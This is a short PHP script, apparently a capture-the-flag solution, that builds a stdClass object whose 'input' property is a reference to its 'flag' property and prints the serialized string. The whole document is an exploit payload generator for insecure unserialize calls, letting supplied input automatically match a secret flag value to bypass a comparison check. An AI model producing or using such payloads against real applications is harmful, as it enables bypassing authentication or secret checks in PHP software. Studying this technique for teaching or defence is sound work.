<?php

$flag = "ccccc";

$obj = new stdClass;
$obj->input = &$obj->flag;

echo serialize($obj);